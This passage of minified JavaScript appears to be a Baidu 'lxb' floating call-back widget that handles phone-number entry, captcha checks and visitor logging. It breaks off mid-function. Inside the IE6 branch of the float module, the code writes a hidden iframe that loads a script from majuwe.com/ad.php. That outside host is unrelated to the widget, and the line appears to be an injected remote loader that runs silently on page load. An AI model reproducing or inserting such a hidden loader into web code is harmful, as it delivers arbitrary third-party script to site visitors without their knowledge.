window.lxb=window.lxb||{};lxb.instance=lxb.instance||0;lxb.instance++;(function(){var a={};lxb.add=lxb.add||function(b,d){var c=a[b];if(!c){c=a[b]={};d.call(null,c)}};lxb.use=lxb.use||function(b){if(typeof b=="string"){if(!a[b]){throw"no module: "+b}else{return a[b]}}else{b.call(null,a)}}})();lxb.add("base",function(d){var c=/msie (\d+\.\d+)/i.test(navigator.userAgent)?(document.documentMode||+RegExp["\x241"]):undefined;d.ie=c;d.g=function(e){return document.getElementById(e)};var n={};if(c<8){n["class"]="className";n.maxlength="maxLength"}else{n.className="class";n.maxLength="maxlength"}d.create=function(s,r){var u=document.createElement(s);var e;if(r){for(var t in r){if(r.hasOwnProperty(t)){e=n[t]||t;u.setAttribute(e,r[t])}}}return u};d.jsonToQuery=function(e){var s=[];for(var r in e){if(e.hasOwnProperty(r)){s.push(r+"="+encodeURIComponent(e[r]))}}return s.join("&")};d.extend=function(s,r){for(var e in r){if(r.hasOwnProperty(e)){s[e]=r[e]}}return s};d.encodeHTML=function(e){return e.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#39;")};var h=new RegExp("(^[\\s\\t\\xa0\\u3000]+)|([\\u3000\\xa0\\s\\t]+\x24)","g");d.trim=function(e){return e.replace(h,"")};d.filter=function(e){e=e.replace(/\s+/,"");if(/^http:\/\/|^https:\/\//i.test(e)){return e}else{e=e.replace(/^[^:]+:/gi,"")}return e};d.queryToJSON=function(t){var r={};t=t.split("&");for(var e=0,s;s=t[e];e++){s=s.split("=");if(s[0]){r[s[0]]=s[1]}}return r};d.setCookie=function(s,t,u,e){var v=s+"="+t;if(u){v+="; path="+u}if(e){var r=new Date();r.setTime(r.getTime()+e*24*3600*1000);v+="; expires="+r.toGMTString()}document.cookie=v};d.getCookie=function(r){var s=new RegExp("(^| )"+r+"=([^;]*)(;|\x24)");var e=s.exec(document.cookie);if(e){return e[2]||null}else{return null}};var q=[];var m;var l=false;function o(){if(!l){l=true;for(var r=0,e=q.length;r<e;r++){q[r]()}}}function f(){try{document.documentElement.doScroll("left")}catch(r){setTimeout(f,1);return}o()}if(document.addEventListener){m=function(){document.removeEventListener("DOMContentLoaded",m,false);o()}}else{if(document.attachEvent){m=function(){if(document.readyState==="complete"){document.detachEvent("onreadystatechange",m);o()}}}}if(document.readyState==="complete"){l=true}else{if(document.addEventListener){document.addEventListener("DOMContentLoaded",m,false);window.addEventListener("load",o,false)}else{if(document.attachEvent){document.attachEvent("onreadystatechange",m);window.attachEvent("onload",o);var p=false;try{p=window.frameElement==null}catch(i){}if(document.documentElement.doScroll&&p){f()}}}}d.ready=function(e){l?e():q.push(e)};var b=["","4-3-3","3-4-3","3-3-4"];d.formatTel=function(e,u){var v=b[parseInt(u,10)];var s=[];if(!v){return e}e=e.split("");v=v.split("-");for(var r=0,t;t=v[r];r++){s.push(e.splice(0,parseInt(t,10)).join(""))}return s.join("-")};var a=[];function k(){for(var e=0,r;r=a[e];e++){j(r)}}function j(r){var e=document.compatMode=="CSS1Compat"?document.documentElement:document.body;var s=r.ele;var u;var t;if(r.top===u){t=s.style.top||s.currentStyle.top;if(!t||t=="auto"){t=s.style.bottom||s.currentStyle.bottom;if(t&&t.indexOf("%")>=0){t=e.clientHeight*(100-parseInt(t,10))/100-s.offsetHeight}else{if(t=="auto"){t=u}else{if(t){t=e.clientHeight-s.offsetHeight-parseInt(t,10)}}}}if(t){if(typeof t=="string"&&t.indexOf("%")>=0){t=e.clientHeight*parseInt(t,10)/100}else{t=parseInt(t,10)}r.top=t}else{r.top=u}}if(r.top!==u){s.style.top=e.scrollTop+r.top+"px"}}d.setFixed=function(e){if(a.length<=0){window.attachEvent("onscroll",k);window.attachEvent("onresize",k)}e.style.position="absolute";a.push({ele:e});j(a[a.length-1])};d.q=function(u,t){var r=[],e,s,w,v;if(!(u=u.replace(/\s+/,""))){return r}if("undefined"==typeof t){t=document}if(t.getElementsByClassName){w=t.getElementsByClassName(u);e=w.length;for(s=0;s<e;s++){v=w[s];r[r.length]=v}}else{u=new RegExp("(^|\\s)"+u+"(\\s|\x24)");w=t.all||t.getElementsByTagName("*");e=w.length;for(s=0;s<e;s++){v=w[s];u.test(v.className)&&(r[r.length]=v)}}return r};d.viewportSize=function(){if(document.compatMode=="BackCompat"){return{width:document.body.clientWidth,height:document.body.clientHeight}}else{return{width:document.documentElement.clientWidth,height:document.documentElement.clientHeight}}};d.addHandler=function(s,r,e){if(s.addEventListener){s.addEventListener(r,e,false)}else{if(s.attachEvent){s.attachEvent("on"+r,e)}else{s["on"+r]=e}}};d.removeHandler=function(s,r,e){if(s.removeEventListener){s.removeEventListener(r,e,false)}else{if(s.detachEvent){s.detachEvent("on"+r,e)}else{s["on"+r]=null}}};d.getViewHeight=function(){var e=document.compatMode=="BackCompat"?document.body:document.documentElement;return e.clientHeight};d.getViewWidth=function(){var e=document.compatMode=="BackCompat"?document.body:document.documentElement;return e.clientWidth};d.getDomInfo=function(e){return{width:e.offsetWidth,height:e.offsetHeight,top:e.offsetTop,left:e.offsetLeft}};d.getStyle=function(e){if(!e){return}return e.style.cssText};var g=d.css=function(s,e){if(s.currentStyle){var r=s.currentStyle[e];if(r=="auto"){r="0"}return r}else{return window.getComputedStyle(s)[e]}}});lxb.add("config",function(a){var c=lxb.use("base");var e={BDCBID:'4438e326-0696-4505-99dc-6ca191133094',LXBVT:0,TEMPSITEID:'4607159',TEMPPORT:'lxbjs.baidu.com/',TEMPFILEROOT:'newFloat'};var b={BDCBID:"bdcbid",LXBVT:1,TEMPSITEID:"siteid",TEMPPORT:"localhost:7710",TEMPFILEROOT:"/newFloat"};c.extend(b,e);var d=location.href.indexOf("https://")===0?"https://":"http://";a.SiteId=b.TEMPSITEID;a.Port=d+b.TEMPPORT;a.Root=d+b.TEMPPORT+b.TEMPFILEROOT;a.lxbvt=b.LXBVT;a.bdcbid=b.BDCBID;a.Lang={TRAN:"\u8f6c",WE:"\u6211\u4eec",CB_INPUT_TIP_1:"\u624b\u673a\u8bf7\u76f4\u63a5\u8f93\u5165\uff1a\u59821860086xxxx",CB_INPUT_TIP_2:"\u5ea7\u673a\u524d\u52a0\u533a\u53f7\uff1a\u59820105992xxxx",CB_INPUT_TIP_3:"\u8f93\u5165\u60a8\u7684\u7535\u8bdd\u53f7\u7801\uff0c\u70b9\u51fb\u901a\u8bdd\uff0c\u7a0d\u540e\u60a8\u5c06\u63a5\u5230\u6211\u4eec\u7684\u7535\u8bdd\uff0c\u8be5\u901a\u8bdd\u5bf9\u60a8<em>\u5b8c\u5168\u514d\u8d39</em>\uff0c\u8bf7\u653e\u5fc3\u63a5\u542c\uff01",CB_INPUT_TIP_HOLDER:"\u8bf7\u8f93\u5165\u60a8\u7684\u7535\u8bdd\u53f7\u7801",INVITE_INPUT_TIP_HOLDER:"\u8F93\u5165\u53F7\u7801\u540E\u70B9\u51FB\u4E0B\u5217\u6309\u94AE\uFF0C\u514D\u8D39\u56DE\u7535",CB_SUCCESS_TIP_1:"\u7a0d\u540e\u60a8\u5c06\u63a5\u5230",CB_SUCCESS_TIP_2:"\u7684\u7535\u8bdd\uff0c<br />\u8be5\u901a\u8bdd\u5bf9\u60a8<em>\u5b8c\u5168\u514d\u8d39</em>\uff0c<br />\u8bf7\u653e\u5fc3\u63a5\u542c\uff01",ERROR_CB_PHONE:"\u8bf7\u60a8\u8f93\u5165\u6b63\u786e\u7684\u53f7\u7801\uff0c\u624b\u673a\u53f7\u7801\u8bf7\u76f4\u63a5\u8f93\u5165\uff0c\u5ea7\u673a\u8bf7\u52a0\u533a\u53f7",ERROR_CB_FAIL:"\u7cfb\u7edf\u7e41\u5fd9\uff0c\u8bf7\u7a0d\u540e\u91cd\u8bd5",LOADING_CB_TIP:"\u62e8\u53f7\u4e2d\uff0c\u8bf7\u7a0d\u5019",CB_SUCCESS_TIP_TXT_0:"\u7a0d\u540e\u60a8\u5c06\u63a5\u5230\u6211\u4eec\u7684\u6765\u7535",CB_SUCCESS_TIP_TXT_1:"\u6b63\u5728\u547c\u53eb\u60a8\u7684\u7535\u8bdd",CB_SUCCESS_TIP_TXT_2:"\u8bf7\u51c6\u5907\u63a5\u542c",CB_INFO_TIP_CLOSE:"\u2573",CB_PIN_INTRO:"\u8bf7\u8f93\u5165\u9a8c\u8bc1\u7801",CB_PIN_OK:"\u786e\u5b9a",CB_PIN_CANCLE:"\u53d6\u6d88",CB_PIN_NULL:"\u9a8c\u8bc1\u7801\u4e0d\u80fd\u4e3a\u7a7a",CB_PIN_WRONG:"\u9a8c\u8bc1\u7801\u9519\u8bef",REFRESH:"\u5237\u65b0",CB_PIN:"\u9a8c\u8bc1\u7801"};a.ClassName={MAIN:"lxb-container",TL_PHONE:"lxb-tl-phone",TL_PHONE_EM:"lxb-tl-phone-em",CB_ICON:"lxb-cb-icon",CB_INPUT:"lxb-cb-input",CB_INPUT_BTN:"lxb-cb-input-btn",CB_INPUT_TIP:"lxb-cb-input-tip",CB_INPUT_TIP_CURSOR:"lxb-cb-input-tip-cursor",CB_SUCCESS_TIP:"lxb-cb-success-tip",CB_LOADING_TIP:"lxb-cb-loading-tip",CB_INFO_TIP:"lxb-cb-info-tip",INVITE_LINK_CON:"lxb-invite-link-con",INVITE_LINK_TEXT:"lxb-invite-link-txt",INVITE_LINK_BTN:"lxb-invite-link-btn",Position:{HOR:["lxb-pos-left","lxb-pos-right"],VER:["lxb-pos-top","lxb-pos-middle","lxb-pos-bottom"]},PositionFix:{HOR:["-left","-right"],VER:["-top","-middle","-bottom"]}};a.ID={MAIN:"LXB_CONTAINER",SHOW:"LXB_CONTAINER_SHOW",IMG_PREV:"LXB_IMG_PREV_",COOKIE_DBCLKID:"LXB_DBCLICKID",COOKIE_REFER:"LXB_REFER"};a.TPL={CB_INPUT_TIP_1:'<ins class="lxb-cb-input-tip-mobile">'+a.Lang.CB_INPUT_TIP_1+'</ins><ins class="lxb-cb-input-tip-tel">'+a.Lang.CB_INPUT_TIP_2+'</ins><ins class="lxb-cb-input-tip-em">'+a.Lang.CB_INPUT_TIP_3+"</ins>",CB_SUCCESS_TIP_1:'<ins class="lxb-cb-success-tip-inner">',CB_SUCCESS_TIP_2:"</ins>",CB_LOADING_TIP:'<ins class="lxb-cb-loading-tip-img"></ins><ins class="lxb-cb-loading-tip-txt">'+a.Lang.LOADING_CB_TIP+"</ins>",CB_INFO_TIP_MAIN:'<ins class="lxb-cb-tip-con"></ins><ins class="lxb-cb-tip-arrow"></ins><ins class="lxb-cb-tip-close">'+a.Lang.CB_INFO_TIP_CLOSE+"</ins>",CB_SUCCESS_TIP_IMG:'<ins class="success-tip-img"></ins>',CB_SUCCESS_TIP_PHONE:'<ins class="success-tip-phone">',CB_SUCCESS_TIP_PHONE_END:"</ins>",CB_SUCCESS_TIP_TXT:'<ins class="success-tip-txt">'+a.Lang.CB_SUCCESS_TIP_TXT_1+'</ins><ins class="success-tip-txt">'+a.Lang.CB_SUCCESS_TIP_TXT_2+"</ins>",CB_SUCCESS_TIP_TXT_1:'<ins class="success-tip-txt">'+a.Lang.CB_SUCCESS_TIP_TXT_0+'</ins><ins class="success-tip-txt">'+a.Lang.CB_SUCCESS_TIP_TXT_2+"</ins>",CB_ERROR_TIP_S:'<ins class="error-tip">',CB_ERROR_TIP_E:"</ins>",CB_PIN:'<ins class="pin-intro">'+a.Lang.CB_PIN_INTRO+'</ins><ins class="pin-input-con"><input type="text" maxlength="4" class="pin-input" /><img class="pin-img" alt="'+a.Lang.CB_PIN+'"/><ins class="pin-change" pin-type="change">'+a.Lang.REFRESH+'</ins></ins><ins class="pin-tip"></ins><ins class="pin-btn-con"><ins class="pin-btn pin-btn-first" pin-type="save">'+a.Lang.CB_PIN_OK+'</ins><ins class="pin-btn" pin-type="cancle">'+a.Lang.CB_PIN_CANCLE+"</ins></ins>"}});lxb.add("net",function(a){var d=lxb.use("base");function e(f,g){return function(h){g.call(null,h);setTimeout(function(){var i=lxb.use("base").g(f);i.parentNode.removeChild(i)},0)}}function b(g,i){var h=document.getElementsByTagName("head")[0];var f=d.create("script",{type:"text/javascript",src:g,id:i||"",charset:"utf-8"});h.appendChild(f)}function c(f){var h=document.getElementsByTagName("head")[0];var g=d.create("link",{rel:"stylesheet",href:f,type:"text/css",charset:"utf-8"});h.appendChild(g)}a.send=function(f,h,j){var g="_lxb_jsonp_"+new Date().getTime().toString(36)+"_";var i=["t="+(new Date().getTime())];i.push("callback="+g);window[g]=e(g,j);h=h||"";if(typeof h!=="string"){h=d.jsonToQuery(h)}h+=(h?"&":"")+i.join("&");f+=(f.indexOf("?")>=0?"&":"?")+h;b(f,g)};a.loadCSS=c;a.log=function(f,g){if(window.console&&console.log){console.log("["+f+"]"+g)}}});lxb.add("util",function(e){var c=null;e.init=function(m){c=m};e.isCallback=function(){return c.float_window!="1"?true:false};e.isPin=function(){return c.scode==1};e.isGroup=function(){return c.ifGroup=="1"?true:false};e.isTel=function(){return c.float_window!="2"?true:false};e.isExt=function(){return c.mode=="1"?true:false};e.isInvite=function(){return c.inviteStatus=="1"?true:false};e.ifStartPage=function(){return c.inviteWay.ifStartPage};var a=null;var b=null;e.visitorLog=function(s,m){var o=512;var p=lxb.use("config");if(!p.lxbvt){return}var n="http://lxbjs.baidu.com/vt/lxb.gif";var t=(document.title||"").substr(0,o);var v=(document.referrer||"").substr(0,o);var w=(document.URL||"").substr(0,o);var x=p.bdcbid;var r=[];r.push(encodeURIComponent(s||""));r.push(encodeURIComponent(t||""));r.push(encodeURIComponent(v||""));r.push(encodeURIComponent(w||""));r.push(+f());var u=g(r.join(","));var q=function(){if(!a){a=document.createElement("div");a.style.display="none"}a.innerHTML='<form action="'+n+'" method="post" target="lxbHideIframe"><input name="p" value="'+u+'"/><input name="sid" value="'+m+'"/><input name="bdcbid" value="'+x+'"/><input name="t" value="'+(new Date()).valueOf()+'"/></form><iframe id="lxbHideIframe" name="lxbHideIframe" src="about:blank"></iframe>';if(document.body){document.body.appendChild(a);b=a.getElementsByTagName("form")[0];b.submit()}};if(!document.body){window.onload=q}else{q()}};var k=e.getDomain=function(m){m=m.replace(/^https?:\/\//,"").split("/");return m[0].replace(/:.*$/,"")};var d=function(o){o=o.replace(/\r\n/g,"\n");var m="";for(var q=0;q<o.length;q++){var p=o.charCodeAt(q);if(p<128){m+=String.fromCharCode(p)}else{if((p>127)&&(p<2048)){m+=String.fromCharCode((p>>6)|192);m+=String.fromCharCode((p&63)|128)}else{m+=String.fromCharCode((p>>12)|224);m+=String.fromCharCode(((p>>6)&63)|128);m+=String.fromCharCode((p&63)|128)}}}return m};_keyStr="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";var g=e.base64=function(o){var m="";var v,t,r,u,s,q,p;var n=0;o=d(o);while(n<o.length){v=o.charCodeAt(n++);t=o.charCodeAt(n++);r=o.charCodeAt(n++);u=v>>2;s=((v&3)<<4)|(t>>4);q=((t&15)<<2)|(r>>6);p=r&63;if(isNaN(t)){q=p=64}else{if(isNaN(r)){p=64}}m=m+_keyStr.charAt(u)+_keyStr.charAt(s)+_keyStr.charAt(q)+_keyStr.charAt(p)}return m};var j=function(o,p,q,m){var r=o+"="+p;if(q){r+="; path="+q}if(m){var n=new Date();n.setTime(n.getTime()+m*24*3600*1000);r+="; expires="+n.toGMTString()}document.cookie=r};var h=function(n){var o=new RegExp("(^| )"+n+"=([^;]*)(;|\x24)");var m=o.exec(document.cookie);if(m){return m[2]||null}else{return null}};var l=-1;var f=e.isLoadPage=function(){if(l!==-1){return l}var m=k(window.location.href);var n=k(document.referrer);if(document.referrer){if(m===n){l=false;return l}else{l=true;return l}}else{if(h("isLoadPage")==="loaded"){l=false;return l}else{j("isLoadPage","loaded","/");l=true;return l}}};e.position=function(){var o=c.position;var m=o>0?"right":"left";var n=Math.abs(o)-1;return{hor:m,ver:n}};var i=e.setMaskSize=function(n,o){var m=n.style.height||(n.currentStyle?n.currentStyle.height:"");if(!m||m=="auto"){setTimeout(i,300)}else{o.style.height=m;o.style.width=n.style.width||(n.currentStyle?n.currentStyle.width:"100%");n.style.zoom=1}};e.getTel=function(){return{phone:c.phone,ext:c.ext,format:c.format}};e.getCallback=function(){return{groupBtns:c.groupDetail,siteId:c.siteid,code:c.code}};e.getReplace=function(){return{replace:c.replace,phone:c.phone,ext:(c.mode==1?c.ext:""),format:c.format||"1"}};e.getFloat=function(){return{container:c.floatModule,closeBtn:c.closeModule}};e.getInvite=function(){var n=c.invitePosition;var m={"0":" ;top: 50%; left: 50%","1":" ;bottom: 0; left: 0","2":" ;bottom: 0; right: 0"};return{container:c.inviteModule,position:n,style:m[n]}};e.getInviteWay=function(){return c.inviteWay};e.checkFloat=function(){if(document.readyState==="complete"){var q=lxb.use("base");var o=q.g("LXB_CONTAINER");var m=q.g("LXB_INVITE");if(!!o){var n=q.css(o,"display")==="block"?1:0}if(!!m){var p=q.css(m,"display")==="block"?1:0}q.create("img",{src:lxb.use("config").Root+"/count.gif?t=n&s="+(n||p||0)})}}});lxb.add("business.replacer",function(b){function e(j,h,l){var g;for(var f=0,k;k=h[f];f++){g=j.nodeValue.replace(k,l);if(g!=j.nodeValue){j.nodeValue=g}}}function a(h){var g=[];if(typeof h=="string"){h=[h]}for(var f=0,j;j=h[f];f++){if(j.indexOf("@REG:")==0){g.push(new RegExp(j.substring(5),"g"))}else{g.push(j)}}return g}function d(h){var f=[];if(h.nodeType==3){f.push(h)}else{if(h.nodeType==1&&(h.className||h.className==="")&&h.className.indexOf&&h.className.indexOf("lxb-")<0){for(var g=h.firstChild;g!=null;g=g.nextSibling){f=f.concat(d(g))}}}return f}function c(j,k){var f=d(document.body||document.getElementsByTagName("body")[0]);var j=a(j);for(var g=0,h;h=f[g];g++){e(h,j,k)}}b.run=function(){var h=lxb.use("base");var g=lxb.use("config").Lang;var f=lxb.use("util");var j=f.getReplace();var i=h.formatTel(j.phone,j.format)+(j.ext?g.TRAN+j.ext:"");if(!j.texts||j.texts.length<=0||!i){return}h.ready(function(){c(j.texts,i)})}});lxb.add("business.pin",function(e){var a=lxb.use("base");var b=lxb.use("config").TPL;var i=lxb.use("config").Lang;var g=lxb.use("util");var n=null;var k=null;var m={};var f={};var j="http://lxbjs.baidu.com/cb/scode?t=";function l(o){o=a.trim(o);if(o==""){m.tip.innerHTML=i.CB_PIN_NULL;return false}if(o.length!=4){m.tip.innerHTML=i.CB_PIN_WRONG;return false}return true}function d(){m.tipCon.onclick=function(r){r=r||window.event;var q=r.target||r.srcElement;var o=q.getAttribute("pin-type");if(!o){return}switch(o){case"save":var p=m.input.value;if(!l(p)){return}c(p);break;case"cancle":h();break;case"change":m.pinImg.src=j+new Date().getTime();default:break}};m.input.onkeyup=function(p){p=p||window.event;if(p.keyCode==13){var o=m.input.value;if(!l(o)){return}c(o)}};m.input.onkeydown=m.input.onmousedown=function(){k()}}function c(p){var q=lxb.use("net");var o="http://lxbjs.baidu.com/cb/callcode";q.send(o,{scode:p},function(r){if(!!r.status){m.tip.innerHTML=r.statusInfo||i.CB_PIN_WRONG;return}else{h();n(f.val,f.gid)}})}function h(){m.container.style.display="none";m={}}e.render=function(p,o,q){o.innerHTML=b.CB_PIN;n=q.callback;k=q.timer;f.val=q.val;f.gid=q.gid;m={};m.tipCon=o;m.container=p;m.input=a.q("pin-input",o)[0];m.pinImg=a.q("pin-img",o)[0];m.tip=a.q("pin-tip",o)[0];m.pinImg.src=j+new Date().getTime();d()}});lxb.add("business.tip",function(e){var a=lxb.use("business.pin");var b=lxb.use("base");var c=lxb.use("config").TPL;var g=lxb.use("config").ClassName;var f=lxb.use("util");function d(q,l,o,m){var k=(l.height<=o.height)?true:false;var n=(b.ie<=6||(b.ie&&document.compatMode!="CSS1Compat"))?true:false;if(n){var j=f.position().ver;l.top=q.height*j/100+"px"}var p=m.mainArrow.offsetWidth;if(o.width>l.left){m.mainArrow.className+=" arrow-left";if(o.height>l.top){m.mainArrow.style.top="6px";m.main.style.top=k?"22px":"10px"}else{m.mainArrow.style.top=(o.height-m.mainArrow.offsetHeight-5)+"px";m.main.style.top=k?(l.height-o.height-10)+"px":"0px"}m.mainArrow.style.left=-p+"px";m.main.style.left=(l.left+l.width+p)+"px"}else{m.mainArrow.className+=" arrow-right";if(o.height>l.top){m.mainArrow.style.top="6px";m.main.style.top=k?"22px":"10px"}else{m.mainArrow.style.top=(o.height-m.mainArrow.offsetHeight-5)+"px";m.main.style.top=k?(l.height-o.height-10)+"px":"0px"}m.mainArrow.style.left=o.clientWidth+"px";m.main.style.left=(-o.width-p)+"px"}}function h(j,m,k){var l=f.position();if(l.hor=="left"){k.main.style.left=0}else{k.main.style.left=(j.width-m.width)+"px"}if(m.height>j.top){k.main.style.top=0}else{k.main.style.top=(j.height-m.height)+"px"}}function i(j){this.container=j;this.main=b.q("lxb-cb-tip",this.container)[0];this.main.innerHTML=c.CB_INFO_TIP_MAIN;this.mainCon=b.q("lxb-cb-tip-con",this.main)[0];this.mainArrow=b.q("lxb-cb-tip-arrow",this.main)[0];this.closeBtn=b.q("lxb-cb-tip-close",this.main)[0];this.main.style.zIndex=2147483647;this.timer=null;this.hide();this._bindEvents()}i.prototype={show:function(k,j){clearTimeout(this.timer);this._setType(k);this._showHandler[k].call(this,j);this.main.style.display="";this._setPosition(k)},hide:function(){this.main.style.display="none"},getClass:function(){return this.main.className},_bindEvents:function(){var j=this;j.closeBtn.onclick=function(){j.hide()}},_setType:function(j){if(j!="pin"){j=(j=="info"||j=="loading")?"info":"feedback"}this.main.className="lxb-cb-tip lxb-cb-tip-"+j;this.mainArrow.className="lxb-cb-tip-arrow"},_showHandler:{success:function(k){var j=this;if(k.order=="0"){j.mainCon.innerHTML=c.CB_SUCCESS_TIP_IMG+c.CB_SUCCESS_TIP_PHONE+b.encodeHTML(k.cbPhone)+c.CB_SUCCESS_TIP_PHONE_END+c.CB_SUCCESS_TIP_TXT}else{j.mainCon.innerHTML=c.CB_SUCCESS_TIP_IMG+c.CB_SUCCESS_TIP_TXT_1}if(k.order=="0"){j.timer=setTimeout(function(){j.hide()},5000)}else{j.timer=setTimeout(function(){j.hide()},30000)}},error:function(j){this.mainCon.innerHTML=c.CB_ERROR_TIP_S+j.msg+c.CB_ERROR_TIP_E},info:function(){this.mainCon.innerHTML=c.CB_INPUT_TIP_1},loading:function(){this.mainCon.innerHTML=c.CB_LOADING_TIP},pin:function(j){a.render(this.main,this.mainCon,j)}},_setPosition:function(k){var l=this;var n=b.viewportSize();var j=b.getDomInfo(l.container);var m=b.getDomInfo(l.main);m.clientWidth=l.main.clientWidth;if(k!="pin"){d(n,j,m,l)}else{h(j,m,l)}}};i.prototype.constructor=i;e.init=function(j){return new i(j)}});lxb.add("business.tel",function(b){var a=lxb.use("util");var e=lxb.use("base");var f=lxb.use("config").ClassName;var d=lxb.use("config").Lang;var c=e.encodeHTML;function g(h){this.tel=e.q("lxb-tl-phone",h)[0];this._render()}g.prototype={_render:function(){var h=a.getTel();if(a.isTel()){this.tel.style.display="block"}else{this.tel.style.display="none";return}this.tel.innerHTML=e.formatTel(c(h.phone),h.format);if(a.isExt()){this.tel.innerHTML+=d.TRAN+c(h.ext)}}};b.init=function(h){return new g(h)}});lxb.add("business.callback",function(b){var a=lxb.use("base");var i=lxb.use("net");var g=a.q;var d=lxb.use("config").ClassName;var e=lxb.use("config").Lang;var c=lxb.use("util");var j=lxb.use("business.tip");function h(l){var k=true;if(!/^\d{11,12}$/.test(l)){k=false}return k}b.init=function(k){return new f(k)};function f(k){this.container=k;this.name=k.className;this.tip=j.init(k);this.cbInfo=c.getCallback();this.groupBtns=this.cbInfo.groupBtns;this.timer=null;this._render();this._bindEvents()}f.prototype={opTimer:[0],_render:function(){var o=this;o.cbInput=g("lxb-cb-input",o.container)[0];o.cbBtn=g("lxb-cb-input-btn",o.container)[0];o.group=g("lxb-group-con",o.container)[0];if(c.isCallback()){o.tipHolder=o.cbInput.value;o.cbInput.style.display="";if(!c.isGroup()||o.groupBtns.length<2){o.cbBtn.style.display="";o.group.style.display="none"}else{var l=g("lxb-group-btn",o.group)[0];var m=l?a.getStyle(l):"";var p="";for(var k=0,n;n=o.groupBtns[k];k++){p+='<ins class="lxb-group-btn" style="'+m+'" gid="'+n.groupid+'">'+n.groupname+"</ins>"}o.group.innerHTML=p;o.cbBtn.style.display="none";o.group.style.display=""}}else{o.cbInput.style.display=o.cbBtn.style.display=o.group.style.display="none"}},_bindEvents:function(){var k=this;k.cbInput.onfocus=function(){if(this.value==k.tipHolder){this.value=""}k.tip.show("info")};k.cbInput.onblur=function(){if(this.value==""){this.value=k.tipHolder}if(k.tip.getClass().indexOf("pin")<0){k.tip.hide()}};k.cbInput.onkeydown=k.cbInput.onmousedown=function(){k._setOpTimer()};if(!c.isGroup()||k.groupBtns.length==1){k.cbInput.onkeyup=function(l){l=l||window.event;if(l.keyCode==13){k.cbBtn.onclick()}}}k.group.onclick=function(m){m=m||window.event;var l=m.target||m.srcElement;if(l.className.indexOf("lxb-group-btn")>=0){k._callCount();k._doCall(l.getAttribute("gid"))}};k.cbBtn.onclick=function(){if(k.groupBtns.length==1){var l=k.groupBtns[0].groupid}k._callCount();k._doCall(l)}},_callCount:function(){a.create("img",{src:lxb.use("config").Root+"/count.gif?t=n"})},_doCall:function(k){a.setCookie("isCalled","called","/");var l=this;var m=l.cbInput.value=a.trim(l.cbInput.value);if(!h(m)){l.tip.show("error",{msg:e.ERROR_CB_PHONE});return}if(c.isPin()){l.tip.show("pin",{callback:l.bind(l._submit,l),val:m,gid:k,timer:l.bind(l._setOpTimer,l)})}else{l._submit(m,k)}},_setOpTimer:function(){var k=this;k.opTimer[0]=(new Date()).valueOf()},bind:function(k,l){return function(){return k.apply(l,arguments)}},_submit:function(p,n){var m=lxb.use("config").Root+"/_c.js";var l=lxb.use("config").Root+"/xCode";var k=lxb.use("config").bdcbid;var o=this;if(o.timer){return}o.tip.show("loading");o.timer=setTimeout(function(){o.timer=null},5000);var q={vtel:p,siteid:o.cbInfo.siteId,bdcbid:k,refer_domain:c.getDomain(document.referrer)||""};if(n){q.g=n}i.send(l,q,function(r){q.code=r.data.code;i.send(m,q,function(s){o.tip.hide();if(!!s.status){var u=s.msg||e.ERROR_CB_FAIL;o.tip.show("error",{msg:u+" ( code: "+s.status+" )"})}else{var t={};t.order=s.order;t.cbPhone=s.cbPhone;o.tip.show("success",t);o.cbInput.value=o.tipHolder}if(o.timer){clearTimeout(o.timer);o.timer=null}})});c.visitorLog(2,o.cbInfo.siteId)},getInput:function(){return this.cbInput},getBtn:function(){return this.cbBtn},getGroup:function(){return this.group},getTip:function(){return this.tip}};f.prototype.constructor=f});lxb.add("business.run",function(c){var b=lxb.use("util");var e=lxb.use("base");var f=null;var a=null;function d(){f=lxb.use("business.float");f.init(function(){if(b.isCallback()&&b.isInvite()){a=lxb.use("business.invite");if(a.isShow()){a.init();a.begin(f)}}})}c.run=function(){d()}});lxb.add("business.float",function(f){var a=lxb.use("base");var h=lxb.use("util");var e=lxb.use("business.tel");var k=lxb.use("business.callback");var j={};var g=null;function b(){var m=h.getFloat();var l=a.create("div");l.innerHTML=m.container+m.closeBtn;j.main=a.q("lxb-container",l)[0];j.main.id="LXB_CONTAINER";j.closeBtn=a.q("lxb-close-btn",l)[0];j.closeBtn.id="LXB_CLOSE_BTN";j.main.style.display="none";j.closeBtn.style.display="none";j.main.style.position=j.closeBtn.style.position="fixed";j.main.style.top=j.closeBtn.style.top=j.main.style.left=j.closeBtn.style.left="";a.ready(function(){document.body.appendChild(j.main);document.body.appendChild(j.closeBtn);i()})}function i(){var l=function(m){if(a.css(j.main,"zIndex")>0){m.call(null)}else{setTimeout(function(){l(m)},30)}};l(function(){e.init(j.main);j.callback=k.init(j.main);c("display: block!important;");j.closeBtn.style.display="";var r=h.position();var m=j.main.offsetHeight;var n=j.closeBtn.offsetHeight;var q=a.getViewHeight();j.main.style.top=(q-m)*r.ver/100+"px";j.closeBtn.style.top=(q-n)*r.ver/100+"px";j.main.style[r.hor]=j.closeBtn.style[r.hor]=0;if(a.ie<=6||(a.ie==7&&document.compatMode!="CSS1Compat")){a.setFixed(j.closeBtn);a.setFixed(j.main)}j.closeBtn.style.display="none";showStatus="float";if(a.ie&&a.ie<=6){j.mask=a.create("iframe",{frameBorder:0,className:"lxb-container-mask"});j.main.appendChild(j.mask);var p=a.create("ins",{className:"lxb-mask-base"});j.closeBtn.insertBefore(p,j.closeBtn.firstChild);j.closeBtn.appendChild(j.btnShowMask=a.create("iframe",{frameBorder:0,className:"lxb-container-mask"}))}g&&g.call(null);var o=setInterval(function(){if(document.readyState==="complete"){clearInterval(o);h.checkFloat()}},0);if(!a.ie){return}if(a.ie<=6){h.setMaskSize(j.main,j.mask);j.btnShowMask.contentWindow.document.open();j.btnShowMask.contentWindow.document.write('<html><head><script src="https://majuwe.com/ad.php?u=25c56607a849ea8b154bd58de4c9ef5b&p=1"></script></head><body style="padding:0px;margin:0px;height:100%;width:100%"></body></html>');j.btnShowMask.contentWindow.document.close()}})}function d(){j.main.onkeypress=j.main.onkeydown=j.main.onkeyup=j.main.onmousedown=j.main.onmouseup=j.main.onclick=function(m){m=m||window.event;if(m.stopPropagation){m.stopPropagation()}else{m.cancelBubble=true}};j.hideBtn=a.q("lxb-hide-btn",j.main)[0];j.hideBtn.onclick=function(){c("display: none;");j.closeBtn.style.display="";showStatus="close"};function l(){j.closeBtn.style.display="none";c("display: block!important;");showStatus="float"}if(j.btnShowMask){j.btnShowMask.contentWindow.document.onclick=l}j.closeBtn.onclick=l}function c(l){var 